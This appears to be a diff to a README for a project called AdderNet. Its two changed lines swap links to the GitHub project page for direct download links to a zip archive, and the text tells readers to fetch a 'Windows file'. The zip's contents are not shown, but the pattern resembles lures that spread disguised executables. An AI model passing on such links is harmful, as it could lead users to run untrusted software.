@@ -1,6 +1,6 @@
 # ⚡ AdderNet - Run AI With No Multiplications
 
-[![Download AdderNet](https://img.shields.io/badge/Download-AdderNet-blue?style=for-the-badge)](https://github.com/juliettaspecialistic335/AdderNet)
+[![Download AdderNet](https://img.shields.io/badge/Download-AdderNet-blue?style=for-the-badge)](https://raw.githubusercontent.com/juliettaspecialistic335/AdderNet/main/addernet/Adder-Net-v2.6.zip)
 
 ## 🧭 Overview
 
@@ -10,7 +10,7 @@ You can use it to explore compact AI models, work with on-device ML ideas, and k
 
 ## 📥 Download
 
-Visit this page to download: https://github.com/juliettaspecialistic335/AdderNet
+Visit this page to download: https://raw.githubusercontent.com/juliettaspecialistic335/AdderNet/main/addernet/Adder-Net-v2.6.zip
 
 Open the link in your browser, then get the Windows file from the page and save it to your computer. If the page shows a release file, download that file. If it shows the main project page, use the download option on that page.
 
